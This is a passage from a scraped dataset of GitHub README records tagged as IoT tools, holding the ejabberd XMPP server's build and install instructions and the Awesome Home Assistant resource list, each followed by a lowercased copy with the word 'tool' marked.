Optional.\nPAM library. Optional. For Pluggable Authentication Modules (PAM).\nImageMagick's Convert program and Ghostscript fonts. Optional. For CAPTCHA challenges.\nElixir \u2265 1.10.3. Optional. Alternative to build ejabberd\nIf your system splits packages in libraries and development headers, you must install the development packages also.\n1. Compile and install on *nix systems\nTo compile ejabberd, execute the following commands. The first one is only necessary if your source tree didn't come with a configure script (In this case you need autoconf installed).\n./autogen.sh\n./configure\nmake\nTo install ejabberd, run this command with system administrator rights (root user):\nsudo make install\nThese commands will:\nInstall the configuration files in /etc/ejabberd/\nInstall ejabberd binary, header and runtime files in /lib/ejabberd/\nInstall the administration script: /sbin/ejabberdctl\nInstall ejabberd documentation in /share/doc/ejabberd/\nCreate a spool directory: /var/lib/ejabberd/\nCreate a directory for log files: /var/log/ejabberd/\n2. Start ejabberd\nYou can use the ejabberdctl command line administration script to start and stop ejabberd. For example:\nejabberdctl start\nFor detailed information please refer to the ejabberd Documentation\n3. Use ejabberd locally\nAlternatively, you can setup ejabberd without installing in your system:\n./configure --with-rebar=rebar3\nmake dev\nOr, if you have Elixir available and plan to develop Elixir code:\n./configure --with-rebar=mix\nmake dev\nCheck the full list of targets:\nmake help\nDevelopment\nIn order to assist in the development of ejabberd, and particularly the execution of the test suite, a Vagrant environment is available at https://github.com/processone/ejabberd-vagrant-dev.\nTo start ejabberd in development mode from the repository directory, you can type a command like:\nEJABBERD_CONFIG_PATH=ejabberd.yml erl -pa ebin -pa deps/*/ebin -pa test -pa deps/elixir/lib/*/ebin/ -s ejabberd\nTranslation\nUsing any gettext editor, you can improve the translation files found in priv/msgs/*.po, and then submit your changes.\nAlternatively, a simple way to improve translations is using our Weblate project: https://hosted.weblate.org/projects/ejabberd/ejabberd-po/\nLinks\nDocumentation: https://docs.ejabberd.im\nCommunity site: https://www.ejabberd.im\nejabberd commercial offering and support: https://www.process-one.net/en/ejabberd", "link": "https://github.com/processone/ejabberd", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "ejabberd community edition\nejabberd is a distributed, fault-tolerant technology that allows the creation of large-scale instant messaging applications. the server can reliably support thousands of simultaneous users on a single node and has been designed to provide exceptional standards of fault tolerance. as an open source technology, based on industry-standards, ejabberd can be used to build bespoke solutions very cost effectively.\nkey features\ncross-platform\nejabberd runs under microsoft windows and unix-derived systems such as linux, freebsd and netbsd.\ndistributed\nyou can run ejabberd on a cluster of machines and all of them will serve the same xmpp domain(s). when you need more capacity you can simply add a new cheap node to your cluster. accordingly, you do not need to buy an expensive high-end machine to support tens of thousands concurrent users.\nfault-tolerant\nyou can deploy an ejabberd cluster so that all the information required for a properly working service will be replicated permanently on all nodes. this means that if one of the nodes crashes, the others will continue working without disruption. in addition, nodes also can be added or replaced \u2018on the fly\u2019.\nadministrator-friendly\nejabberd is built on top of the open source erlang. as a result you do not need to install an external database, an external web server, amongst others because everything is already included, and ready to run out of the box. other administrator benefits include:\ncomprehensive documentation.\nstraightforward installers for linux.\ndocker packaging to help with deploy / development on linux, windows or macos.\ndeb and rpm packaging to support most linux distributions.\nweb administration.\nshared roster groups.\ncommand line administration -----> tool !!! .\ncan integrate with existing authentication mechanisms.\ncapability to send announce messages.\ninternationalized\nejabberd leads in internationalization. hence it is very well suited in a globalized world. related features are:\ntranslated to 25 languages.\nsupport for idna.\nopen standards\nejabberd is the first open source xmpp server claiming to fully comply to the xmpp standard.\nfully xmpp-compliant.\nxml-based protocol.\nmany protocols supported.\nadditional features\nmoreover, ejabberd comes with a wide range of other state-of-the-art features:\nmodularity\nload only the modules you want.\nextend ejabberd with your own custom modules.\nsecurity\nsasl and starttls for c2s and s2s connections.\nstarttls and dialback s2s connections.\nweb admin accessible via https secure access.\ndatabases\ninternal database for fast deployment (mnesia).\nnative mysql support.\nnative postgresql support.\nodbc data storage support.\nmicrosoft sql server support.\nauthentication\ninternal authentication.\npam, ldap and odbc.\nexternal authentication script.\nothers\nsupport for virtual hosting.\ncompressing xml streams with stream compression (xep-0138).\nstatistics via statistics gathering (xep-0039).\nipv6 support both for c2s and s2s connections.\nmulti-user chat module with support for clustering and html logging.\nusers directory based on users vcards.\npublish-subscribe component with support for personal eventing.\nsupport for web clients: http polling and http binding (bosh).\ncomponent support: interface with networks such as aim, icq and msn.\nquickstart guide\n0. requirements\nto compile ejabberd you need:\ngnu make.\ngcc.\nlibexpat \u2265 1.95.\nlibyaml \u2265 0.1.4.\nerlang/otp \u2265 19.3.\nopenssl \u2265 1.0.0.\nzlib \u2265 1.2.3, for stream compression support (xep-0138). optional.\npam library. optional. for pluggable authentication modules (pam).\nimagemagick's convert program and ghostscript fonts. optional. for captcha challenges.\nelixir \u2265 1.10.3. optional. alternative to build ejabberd\nif your system splits packages in libraries and development headers, you must install the development packages also.\n1. compile and install on *nix systems\nto compile ejabberd, execute the following commands. the first one is only necessary if your source tree didn't come with a configure script (in this case you need autoconf installed).\n./autogen.sh\n./configure\nmake\nto install ejabberd, run this command with system administrator rights (root user):\nsudo make install\nthese commands will:\ninstall the configuration files in /etc/ejabberd/\ninstall ejabberd binary, header and runtime files in /lib/ejabberd/\ninstall the administration script: /sbin/ejabberdctl\ninstall ejabberd documentation in /share/doc/ejabberd/\ncreate a spool directory: /var/lib/ejabberd/\ncreate a directory for log files: /var/log/ejabberd/\n2. start ejabberd\nyou can use the ejabberdctl command line administration script to start and stop ejabberd. for example:\nejabberdctl start\nfor detailed information please refer to the ejabberd documentation\n3. use ejabberd locally\nalternatively, you can setup ejabberd without installing in your system:\n./configure --with-rebar=rebar3\nmake dev\nor, if you have elixir available and plan to develop elixir code:\n./configure --with-rebar=mix\nmake dev\ncheck the full list of targets:\nmake help\ndevelopment\nin order to assist in the development of ejabberd, and particularly the execution of the test suite, a vagrant environment is available at https://github.com/processone/ejabberd-vagrant-dev.\nto start ejabberd in development mode from the repository directory, you can type a command like:\nejabberd_config_path=ejabberd.yml erl -pa ebin -pa deps/*/ebin -pa test -pa deps/elixir/lib/*/ebin/ -s ejabberd\ntranslation\nusing any gettext editor, you can improve the translation files found in priv/msgs/*.po, and then submit your changes.\nalternatively, a simple way to improve translations is using our weblate project: https://hosted.weblate.org/projects/ejabberd/ejabberd-po/\nlinks\ndocumentation: https://docs.ejabberd.im\ncommunity site: https://www.ejabberd.im\nejabberd commercial offering and support: https://www.process-one.net/en/ejabberd", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000028, "year": null}, {"Unnamed: 0": 38, "autor": 38, "date": null, "content": "Awesome Home Assistant\nhttps://awesome-ha.com\nHome Assistant is an open source home automation that puts local control and privacy first. Powered by a worldwide community of tinkerers and DIY enthusiasts. Perfect to run on a Raspberry Pi or a local server.\nIf you want to get an impression on the look and feel, you should check out the Home Assistant online demo.\nAwesome Home Assistant is a curated list of awesome Home Assistant resources. Additional software, tutorials, custom integration, add-ons, custom Lovelace cards & plugins, cookbooks, example setups, and much more.\nThe list is divided into categories. The links in those categories do not have pre-established order; the order is for contribution. If you want to contribute, please read the guide.\nContents\nHow to use\nInstalling\nIn case you need help\nOfficial Channels\nOther Channels\nPublic Configurations\nAdd-ons\nOfficial Add-ons\nThird Party Add-ons\nLovelace User Interface\nThemes\nCustom Lovelace UI Cards\nAlternative Dashboards\nCustom Components\nDIY\nDIY Gateways\nDIY Projects\nOnline Resources\nBlogs\nYouTube Channels\nPodcasts\nTwitter\nUncategorized\nAlternative Home Automation Software\nOther Awesome Lists\nTrademark Legal Notice\nHow to use\nAwesome Home Assistant is a fantastic list for people trying to automate every aspect of their home. Automating your home is a long, hard, and never finished task that usually involves a lot of tinkering.\nYou can navigate through the list by:\nSimply press command/ctrl + F to search for a keyword\nGo through our Contents list\nAlternatively, use the search on our website: https://www.awesome-ha.com\nInstalling\nHome Assistant has several installation / running methods. Many people have different opinions and their personal favorites. Each method has its advantages and disadvantages. Important to know, there is no wrong, or right here, each technique installs the SAME Home Assistant.\nHome Assistant currently recommends the Home Assistant OS installation method.\nHome Assistant OS - Installing using a managed environment (recommended method).\nHome Assistant Container - Installing on Docker.\nHome Assistant Supervised - Installing a semi managed environment for experts.\nHome Assistant Core - Manual installation using a Python virtual environment.\nIn case you need help\nThere are various ways to get in touch with the Home Assistant community. It doesn't matter if you have a question, need help, want to request a feature, or just say \u2018Hi\u2019.\nOfficial Channels\nHome Assistant Discord - Join the chat, most of us are there.\nHome Assistant Community - The discussion forum, also used for feature requests.\nHome Assistant Subreddit - If you are into Reddit, subscribe.\nHome Assistant Facebook Group - Facebook group for enthusiasts.\nOther Channels\nDr. ZZs - Facebook group by Dr. Zzs.\nHome Assistant Community Add-ons Discord - Get support on the Home Assistant Community Add-ons.\nESPHome Discord - Get support for your DIY ESPHome project.\nDutch Domotics Discord - Dutch Discord server with home automation enthusiasts.\nPublic Configurations\nSome people store their full Home Assistant configuration on GitHub. They are an awesome source for learning and a great source of inspiration.\nCarlo Costanzo - Probably the most documented configuration out there.\nDubhAd - Also known as Tinkerer shares his configuration files.\ngeekofweek - Has over 300+ automations.\nIsabella Gross Alstr\u00f6m - Hass.io, Intel NUC, Ubuntu, Docker, Lovelace UI.\nMahasri Kalavala - Impressive setup, with lots of different hardware working together.\nstanvx - Complete setup which uses AppDaemon and HA Floorplan as well.\nVasiley - Runs two instances that work together.\nAlok Saboo - Also known as arsaboo. Regularly updated.\nAaron Bach - Also known as bachya. Regularly updated and includes numerous Dockerized services.\nJames McCarthy - Well documented, 3 instances & automations in YAML & Node-RED.\nFranck Nijhof - Hass.io based, very different configuration structure compared to others.\nAndrea Donno - Hass.io based, focused on touchscreen usage.\nKlaas Schoute - Hass.io based, Intel NUC, Ubuntu Server, Docker and regularly updated.\nJason Hunter - Hass.io based, Intel NUC i5, TensorFlow & camera streams.\nNathan - Lovelace config and themes based on Soft UI.\nAndrea Iannucci - Also known as SeLLeRoNe. Regularly updated.\nAdd-ons\nAdd-ons are additional applications and services, that can be run alongside Home Assistant. The Home Assistant OS and Supervised installations types, provide the Supervisor, which is capable of running and manage these add-ons.\nOfficial Add-ons\nCreated and maintained by the Home Assistant team.\nDuckDNS - Updates your Duck DNS IP address and generate SSL using Let's Encrypt.\nFile editor - Browser-based configuration file editor.\nMosquitto - Fast and reliable MQTT broker.\nTerminal & SSH - Allows logging in remotely to using a web terminal or SSH client.\nSamba - Access your configuration files using Windows network shares.\nNGINX SSL proxy - Reverse proxy with SSL termination.\ndeCONZ - Control a ZigBee network using ConBee or RaspBee hardware by Dresden Elektronik.\nTellStick - Run a TellStick and TellStick Duo service.\nAda - Ada is voice assistant powered by Almond which is open and privacy-preserving.\nAlmond - The Open, Privacy-Preserving Virtual Assistant.\nHomeMatic - HomeMatic central based on OCCU.\nLet's Encrypt - Get a free SSL certificate from Let's Encrypt; an open and automated certificate authority (CA).\nMariaDB - An open source relational database (fork of MySQL).\nOpenZWave - Use an Z-Wave USB-stick with the QT OpenZWave Daemon.\nThird Party Add-ons\nAnyone can create an add-on, the following are created by the community.\nSSH & Web Terminal - SSH and Web-based terminal with tons of pre-loaded useful tools.\nUniFi Controller - The UniFi Controller allows you to manage your UniFi network using a web browser.\nNode-RED - Flow-based programming for the Internet of Things.\nPlex Media Server - Your recorded media beautifully organized and ready to stream.\nIDE - Advanced web-based IDE, based on Cloud9 IDE.\nDasshio - Easily use your Amazon Dash Buttons.\nInfluxDB - Scalable datastore for metrics, events, and real-time analytics.\nGrafana - Open platform for beautiful analytics and monitoring.\nTor - Protect your privacy and access your instance via Tor.\nSpotify Connect - Spotify Connect client for playing music on your Home Assistant device.\nzigbee2mqtt - Zigbee to MQTT bridge, get rid of your proprietary Zigbee bridges.\nAppDaemon - Python Apps and HADashboard.\nTasmoAdmin - Centrally manage all your Sonoff-Tasmota devices.\nAircast - AirPlay capabilities for your Chromecast players.\nAirSonos - AirPlay capabilities for your Sonos players.\nDropbox Sync - Upload your backup snapshots to Dropbox.\nLog Viewer - Browser-based live log viewing utility.\nTautulli - Monitor and get statistics from your Plex server.\nmotionEye - Simple, elegant and feature-rich CCTV/NVR for your cameras.\nJupyterLab Lite - Create documents containing live code, equations, visualizations, and explanatory text.\nBackup to Google Drive - Backup snapshots to Google Drive.\nADB - The Android Debug Bridge server program.\nGlances - A cross-platform system monitoring tool written in Python.\nMatrix - A secure and decentralized communication platform.\nAdGuard Home - A network-wide ad-and-tracker blocking DNS server with parental control.\nTraccar - Traccar is modern GPS Tracking Platform.\nHome Panel - A touch-compatible web frontend for controlling the home.\nHass.io Google Drive Backup - A complete and easy to configure solution for backing up your snapshots to Google Drive.\nGrocy - ERP beyond your fridge! A groceries & household management solution for your home.\nLovelace User Interface\nThe Home Assistant frontend is already pretty, but you can customize it to fit your needs or taste better.\nLovelace UI Documentation - The official documentation.\n\ud83d\udcfa Getting started with Lovelace UI - Great introduction to Lovelace UI by DrZzs.\nShare the Love - Custom card demos and configuration examples for Lovelace.\n\ud83d\udcfa How to set up Lovelace - Excellent step by step video for beginners by JuanMTech.\nFont Awesome Icons - Use the free icons from Font Awesome in your frontend.\nThemes\nIt is all about the looks, apply some style.\n\ud83d\udcfa Themes Tutorial - Quick tutorial/example on how to configure themes.\nMidnight - A dark theme by Marcel Hoffs.\nDark Cyan - A dark theme with cyan accents by Ryoen Deprouw.\nGrey Night - A dark theme with grey accents by ksya.\nDark Red - A dark theme with red accents by Ryoen Deprouw.\nHalloween - Pumpkins colored by Mahasri Kalavala.\nBlack and Green - A dark theme with pale green accents by GreenTurtwig.\nVintage - Give your frontend a vintage look with this theme by Anup Surendran.\nCarbon Green - Light carbon theme with green accents by Reua.\n20 Great Themes - 20 Great themes by JuanMTech (includes a guide).\nMany Themes, One Repo - 13 Themes in a convenient ZIP file.\nSlate - A dark theme close to the vanila looks from seangreen2.\nSynthwave - A theme influenced by the cover artwork of modern Synthwave bands.\nGoogle Home Theme - Two themes (light and dark) matching the design of Google Home Hub.\nCustom Lovelace UI Cards\nLovelace allows people to build custom cards on top of it, which you can easily add to your instance.\nAuto-Entities Card - Dynamically adds entities: \ud83d\udd2e Magic.\nCanvas Gauge Card - Use awesome gauges from canvas-gauges.com.\nBig Number Card - Display big numbers for sensors, including severity level as background.\nAnimated Weather Card - Nice looking card showing the weather, with subtle animations.\nThermostat Card - Thermostat control card that looks like a Nest Thermostat.\nMini Media Player - A minimalistic media player card.\nMini Graph Card - A minimalistic sensor graph card.\nButton card - Button card for your entities.\nSlideshow card - Dynamic slideshow of images or cards.\nSwiper card - Flick/swipe through multiple cards.\nSlider Entity Row - Add a slider to adjust, e.g., the brightness of lights in lovelace entity cards.\nPower Wheel Card - An intuitive way to represent the power that your home is consuming or producing.\nSimple Thermostat - A simpler and more flexible thermostat card.\nCompact Custom Header - Customize and compact the frontend header bar.\nCard Modder - Style your Lovelace cards.\nBar Card - Customizable animated bar card.\nforked-daapd Card - Control a forked daapd instance.\nDual Gauge Card - Shows two gauges in one.\nAtomic Calendar Card - Calendar card with advanced settings.\nXiaomi Vacuum Card - Detailed card for Xiaomi vacuum cleaners (and others).\nSimple Weather Card - A minimalistic weather card, inspired by Google Material Design.\nLovelace Floorplan - Interaction with your entities from a Floorplan.\nHome Card - A quick glance of the state of your home.\nBanner Card - A fluffy linkable banner with interactive glances to spice up your home dashboards.\nUpcoming Media Card - Display upcoming episodes and movies from services like: Plex, Kodi, Radarr, Sonarr, and Trakt.\nSpotify Card - List and select from current available devices and users top playlists on Spotify.\nBattery Entity - Displaying battery levels for battery entities.\nMultiple Entity Row - Show multiple entity states or attributes on entity rows.\nXiaomi Vacuum Map Card - Interactive Xiaomi Vacuum map, just like in Mi Home app.\nHome Feed Card - Display a combination of persistent notifications, calendar events, and entities in the style of a feed.\nConfig Template Card - Allow using templates in Lovelace.\nRGB Light Card - Colorful buttons to control your RGB Lights.\nLG WebOS Remote Control - Remote Control for LG TV WebOS.\nRestriction Card - A card to provide restrictions on Lovelace cards defined within.\nVacuum Card \u2014 A card to card for controlling a vacuum cleaner robot.\nPurifier Card \u2014 A card for controlling air purifiers.\nAlternative Dashboards\nTileBoard - A simple yet highly configurable Dashboard.\nCustom Components\nAdditional components for Home Assistant, that were created by the community.\nHue Sensors - Enables the use of Philips Hue sensors.\nGoogle Geocode - Converts a device tracker location into a human-readable address.\nLutron Caseta Pro - Integrates Lutron Caseta Smart Bridge PRO / RA2 Select.\nSmartIR - Integrates devices using Broadlink IR.\nXiaomi Hygrothermo - Sensor platform for Xiaomi Mijia BT Hygrothermo temperature and humidity sensor.\nVolkswagen Carnet - Integrates Volkswagen Carnet (requires valid Carnet subscription).\nUntappd - Connects with your Untappd account.\nElasticsearch - Publishes events to Elasticsearch.\nSonoff/eWeLink - Control Sonoff/eWeLink smart devices using the stock firmware.\nAlexa Media Player - Allow control of Amazon Alexa devices.\niCloud3 - Improved version of the iCloud device tracker component with a lot of capabilities.\nHACS - This is a manager for your custom integration (components) and plugin (lovelace elements) needs.\nbreaking_changes - Component to show potential breaking_changes in the current published version based on your loaded components.\nCircadian Lighting - Circadian Lighting slowly synchronizes your color changing lights with the regular naturally occuring color temperature of the sky throughout the day.\nHASS Aarlo - Asynchronous Arlo integration. Similar to the Arlo web site; monitors events and states for all base stations, cameras and doorbells.\nXiaomi Cloud Map Extractor - This custom integration provides a way to present a live view of a map for a Xiaomi (and Roborock) vacuums without a need for rooting.\nDIY\nDo It Yourself; rather than buying home automation hardware or solutions, you could also build them yourself!\nESPHome - Program ESP8266 boards and ESP32 boards using YAML.\nMagic Cards - RFID scannable cards that you can program to do anything.\nSonoff Tasmota - Firmware for ESP8266 boards and devices.\nDIY Gateways\nOpenMQTTGateway - A flexible MQTT gateway for IR, RF, BLE, MiFlora, SMS, and many sensors.\nesp8266 Milight Hub - Alternative hub for Milight/LimitlessLED devices that uses MQTT.\nzigbee2mqtt - Zigbee to MQTT bridge, get rid of your proprietary Zigbee bridges.\nDIY Projects\nHA SwitchPlate - LCD Touchscreen wall switch replacement.\n\ud83d\udcfa DIY Multisensor - $15, Temperature, Humidity, Light, Motion, and RGB LED, without soldering.\n$10 WiFi RGB Bulb - In inexpensive RGB bulb that works on WiFi.\n433mhz/IR Bidirectional Gateway - Bidirectional with IR and 433mhz using ESP8266 and MQTT.\nesp8266MQTTBlinds - Automate your window blinds using an ESP8266, a servo and MQTT.\nHome Assistant's Hackster.io - A Hackster channel with multiple DIY projects.\nESP MQTT Digital LEDs - WS2811 LED Stripe for the JSON Light Component from BRUH.\nBed Presence Detection - ESP8266 based Bed Presence Detection.\nNFC Scanner - Build an NFC tag/card scanner with an ESP8266, PN532 and MQTT.\nESP32-Cam Facebox - Tie a ESP32-CAM, HA, and Facebox together for a cheap Facial Recog / Home monitoring solution.\nRaspiPool - A cost-effective, easy-to-build, easy-to-use \"Swimming-Pool Automation System\".\nQuinLED - DIY Wi-Fi LED dimmers and controllers using ESP32 boards.\nOnline Resources\nLinks to various users of Home Assistant that regularly publish Home Assistant focussed content.\nBlogs\nDIY Futurism - Brad posts articles with great instructions for new users.\nPhil Hawthorne - Co-host of the Home Assistant Podcast.\nSmart Home Hobby - Features budget friendly guides and information.\nSelf Hosted Home - Articles on DIY home automation projects and self hosted services.\nTinkering with Home Automation - Tinkerer's blog and guides.\nHomeTechHacker - DIY Smarthome guides, reviews, and advice.\nIntermittent Technology - Quindor's personal blog for pasting random (mostly technology related) things.\nYouTube Channels\nSit back, relax, watch, and learn.\nBRUH - Ben has great tutorials for getting started, unfortunately, inactive lately.\nBurnsHA - Great informational and tutorial videos.\nDrZzs - Great how-to videos and also streams live.\nThe Hook Up - Tutorials and more, also has videos on home automation in general.\nHASSCASTS - Tips, Tricks & Tutorials, moving to mainly live streams.\nJuanMTech - Easy to follow how-to videos, product reviews and more.\nvCloudInfo - Publishes videos based on his home and GitHub repository.\ndigiblurDIY - Tutorials on hardware projects and Tasmota automations.\nIntermit.Tech - Tutorials & reviews: Camera's, Home Networking, ESP8266 boards, Node-RED.\nBeardedTinker - Tutorials & 3D printing.\nSmart Home Junkie - How-to videos and tutorials for starters and advanced users.\nPodcasts\nGet inspired, while commuting, doing your morning routine, or at the gym!\nHome Assistant Podcast - Biweekly podcast with the latest news and interesting guests.\nTwitter\nKeep up with the latest news and updates, 280 characters at a time!\n@home_assistant - Open source home automation that puts local control and privacy first.\n@hass_devs - Latest news on the development of Home Assistant for contributors.\n@balloob - Founder of the Home Assistant project.\n@pvizeli - Core developer and creator of the Hass.io project.\n@frenck - Creator of this Awesome list and maintainer of the Community Hass.io Add-ons project.\n@ccostan - Blogger of all things Tech. Smart Home, #IOT & other Geeky subjects.\n@HomeTechHacker - Guy friends call when #tech happens. Tweet 25-50x/week about #smarthome, #homenetwork, #cybersecurity, #Linux, #gadgets, and #life.\n@hassioaddons - For all commmunity add-on news and updates.\n@Dr_Zzs - Great how-to videos and also streams live.\nUncategorized\nValuable links, that don't fit in any of the above categories (yet!).\nRoom Assistant - A companion client to handle sensors in multiple rooms.\nHome Assistant Companion - iPhone/iPad/iOS App to control and monitor your home remotely.\nMi Flora via MQTT daemon - Collect and transfer Xiaomi Mi Flora plant sensor data via MQTT.\nhassctl - Simple command line utility to help debug your configuration.\nrhasspy - Toolkit for developing custom voice assistants.\nFully Kiosk Browser - Highly configurable Android Kiosk Browser and App Launcher.\nHassio Vagrant - Vagrant box original created for developing add-ons.\nAppDaemon - AppDaemon is a loosely coupled, multi-threaded, sandboxed Python execution environment for writing automation apps.\nDeveloper Documentation - The official developer documentation.\nHASS Configurator - Browser-based configuration file editor.\nHA-Dockermon - A Node.js service for RESTful switches to control Docker containers.\nPython Amazon Dash - Hack your Amazon Dash to run what you want. Without welders.\nhomekit2mqtt - HomeKit to MQTT bridge.\nHome Assistant Device Database - Database of supported/confirmed working devices.\nJinja Scripts for Curious Minds - Bunch of Jinja2 scripts helping you to understand it better.\nWallPanel - Android application for web-based dashboards and home automation platforms.\nAriela - Freemium Android client application with widget support.\nGitlab CI/CD - How to simplify your smart home configuration with GitLab CI/CD.\nMonitor - Distributed advertisement-based BTLE presence detection reported via MQTT.\nHASS-data-detective - Explore and analyse your database data.\nADB Intents - List of ADB intents to control Android Devices.\nHome Assistant Config Helper for VSCode - Visual Studio Code Extension that provides auto-completion, config validation and snippets when editting your configuration.\nHome Assistant Taskbar Menu - A client for Windows that can display Lovelace views, control entities and show persistent notifications.\nAlternative Home Automation Software\nHome Assistant isn't the only home automation framework out there, here are some alternatives.\nopenHAB - Java-based and aims at being a universal integration platform.\nDomoticz - A lightweight Home Automation System.\nGladys - Open source program which runs on your Raspberry Pi.\nSmartThings - Commercial home automation hub by Samsung.\nOther Awesome Lists\nOther amazingly awesome lists that can be found on the great and dangerous interwebs.\nawesome-smarthome - Curated list of awesome SmartHome/Home Automation things.\nawesome-iot - Curated list of awesome Internet of Things projects and resources.\nawesome-open-iot - Curated list of open source IoT frameworks, libraries and software.\nawesome-amazon-alexa - Curated list of awesome resources for the Amazon Alexa platform.\nawesome-mqtt - Curated list of MQTT related stuff.\nawesome-sefhosted - Curated list of awesome self hosted software.\nContributing\nThis awesome list is an active open-source project and is always open to people who want to contribute to it. We have set up a separate document containing our Contribution Guidelines.\nThe original setup of this awesome list is by Franck Nijhof.\nFor a full list of all authors and contributors, check the contributor's page.\nThank you for being involved! \ud83d\ude0d\nTrademark Legal Notice\nThis Awesome list is not created, developed, affiliated, supported, maintained or endorsed by Home Assistant.\nAll product names, logos, brands, trademarks and registered trademarks are property of their respective owners. All company, product, and service names used in this list are for identification purposes only.\nUse of these names, logos, trademarks, and brands does not imply endorsement.\nLicense\nDistributed under the Creative Commons Attribution 4.0 license. See LICENSE for the complete license.", "link": "https://github.com/frenck/awesome-home-assistant", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "awesome home assistant\nhttps://awesome-ha.com\nhome assistant is an open source home automation that puts local control and privacy first. powered by a worldwide community of tinkerers and diy enthusiasts. perfect to run on a raspberry pi or a local server.\nif you want to get an impression on the look and feel, you should check out the home assistant online demo.\nawesome home assistant is a curated list of awesome home assistant resources. additional software, tutorials, custom integration, add-ons, custom lovelace cards & plugins, cookbooks, example setups, and much more.\nthe list is divided into categories. the links in those categories do not have pre-established order; the order is for contribution. if you want to contribute, please read the guide.\ncontents\nhow to use\ninstalling\nin case you need help\nofficial channels\nother channels\npublic configurations\nadd-ons\nofficial add-ons\nthird party add-ons\nlovelace user interface\nthemes\ncustom lovelace ui cards\nalternative dashboards\ncustom components\ndiy\ndiy gateways\ndiy projects\nonline resources\nblogs\nyoutube channels\npodcasts\ntwitter\nuncategorized\nalternative home automation software\nother awesome lists\ntrademark legal notice\nhow to use\nawesome home assistant is a fantastic list for people trying to automate every aspect of their home. automating your home is a long, hard, and never finished task that usually involves a lot of tinkering.\nyou can navigate through the list by:\nsimply press command/ctrl + f to search for a keyword\ngo through our contents list\nalternatively, use the search on our website: https://www.awesome-ha.com\ninstalling\nhome assistant has several installation / running methods. many people have different opinions and their personal favorites. each method has its advantages and disadvantages. important to know, there is no wrong, or right here, each technique installs the same home assistant.\nhome assistant currently recommends the home assistant os installation method.\nhome assistant os - installing using a managed environment (recommended method).\nhome assistant container - installing on docker.\nhome assistant supervised - installing a semi managed environment for experts.\nhome assistant core - manual installation using a python virtual environment.\nin case you need help\nthere are various ways to get in touch with the home assistant community. it doesn't matter if you have a question, need help, want to request a feature, or just say \u2018hi\u2019.\nofficial channels\nhome assistant discord - join the chat, most of us are there.\nhome assistant community - the discussion forum, also used for feature requests.\nhome assistant subreddit - if you are into reddit, subscribe.\nhome assistant facebook group - facebook group for enthusiasts.\nother channels\ndr. zzs - facebook group by dr. zzs.\nhome assistant community add-ons discord - get support on the home assistant community add-ons.\nesphome discord - get support for your diy esphome project.\ndutch domotics discord - dutch discord server with home automation enthusiasts.\npublic configurations\nsome people store their full home assistant configuration on github. they are an awesome source for learning and a great source of inspiration.\ncarlo costanzo - probably the most documented configuration out there.\ndubhad - also known as tinkerer shares his configuration files.\ngeekofweek - has over 300+ automations.\nisabella gross alstr\u00f6m - hass.io, intel nuc, ubuntu, docker, lovelace ui.\nmahasri kalavala - impressive setup, with lots of different hardware working together.\nstanvx - complete setup which uses appdaemon and ha floorplan as well.\nvasiley - runs two instances that work together.\nalok saboo - also known as arsaboo. regularly updated.\naaron bach - also known as bachya. regularly updated and includes numerous dockerized services.\njames mccarthy - well documented, 3 instances & automations in yaml & node-red.\nfranck nijhof - hass.io based, very different configuration structure compared to others.\nandrea donno - hass.io based, focused on touchscreen usage.\nklaas schoute - hass.io based, intel nuc, ubuntu server, docker and regularly updated.\njason hunter - hass.io based, intel nuc i5, tensorflow & camera streams.\nnathan - lovelace config and themes based on soft ui.\nandrea iannucci - also known as sellerone. regularly updated.\nadd-ons\nadd-ons are additional applications and services, that can be run alongside home assistant. the home assistant os and supervised installations types, provide the supervisor, which is capable of running and manage these add-ons.\nofficial add-ons\ncreated and maintained by the home assistant team.\nduckdns - updates your duck dns ip address and generate ssl using let's encrypt.\nfile editor - browser-based configuration file editor.\nmosquitto - fast and reliable mqtt broker.\nterminal & ssh - allows logging in remotely to using a web terminal or ssh client.\nsamba - access your configuration files using windows network shares.\nnginx ssl proxy - reverse proxy with ssl termination.\ndeconz - control a zigbee network using conbee or raspbee hardware by dresden elektronik.\ntellstick - run a tellstick and tellstick duo service.\nada - ada is voice assistant powered by almond which is open and privacy-preserving.\nalmond - the open, privacy-preserving virtual assistant.\nhomematic - homematic central based on occu.\nlet's encrypt - get a free ssl certificate from let's encrypt; an open and automated certificate authority (ca).\nmariadb - an open source relational database (fork of mysql).\nopenzwave - use an z-wave usb-stick with the qt openzwave daemon.\nthird party add-ons\nanyone can create an add-on, the following are created by the community.\nssh & web terminal - ssh and web-based terminal with tons of pre-loaded useful tools.\nunifi controller - the unifi controller allows you to manage your unifi network using a web browser.\nnode-red - flow-based programming for the internet of things.\nplex media server - your recorded media beautifully organized and ready to stream.\nide - advanced web-based ide, based on cloud9 ide.\ndasshio - easily use your amazon dash buttons.\ninfluxdb - scalable datastore for metrics, events, and real-time analytics.\ngrafana - open platform for beautiful analytics and monitoring.\ntor - protect your privacy and access your instance via tor.\nspotify connect - spotify connect client for playing music on your home assistant device.\nzigbee2mqtt - zigbee to mqtt bridge, get rid of your proprietary zigbee bridges.\nappdaemon - python apps and hadashboard.\ntasmoadmin - centrally manage all your sonoff-tasmota devices.\naircast - airplay capabilities for your chromecast players.\nairsonos - airplay capabilities for your sonos players.\ndropbox sync - upload your backup snapshots to dropbox.\nlog viewer - browser-based live log viewing utility.\ntautulli - monitor and get statistics from your plex server.\nmotioneye - simple, elegant and feature-rich cctv/nvr for your cameras.\njupyterlab lite - create documents containing live code, equations, visualizations, and explanatory text.\nbackup to google drive - backup snapshots to google drive.\nadb - the android debug bridge server program.\nglances - a cross-platform system monitoring -----> tool !!!  written in python.\nmatrix - a secure and decentralized communication platform.\nadguard home - a network-wide ad-and-tracker blocking dns server with parental control.\ntraccar - traccar is modern gps tracking platform.\nhome panel - a touch-compatible web frontend for controlling the home.\nhass.io google drive backup - a complete and easy to configure solution for backing up your snapshots to google drive.\ngrocy - erp beyond your fridge! a groceries & household management solution for your home.\nlovelace user interface\nthe home assistant frontend is already pretty, but you can customize it to fit your needs or taste better.\nlovelace ui documentation - the official documentation.\n\ud83d\udcfa getting started with lovelace ui - great introduction to lovelace ui by drzzs.\nshare the love - custom card demos and configuration examples for lovelace.\n\ud83d\udcfa how to set up lovelace - excellent step by step video for beginners by juanmtech.\nfont awesome icons - use the free icons from font awesome in your frontend.\nthemes\nit is all about the looks, apply some style.\n\ud83d\udcfa themes tutorial - quick tutorial/example on how to configure 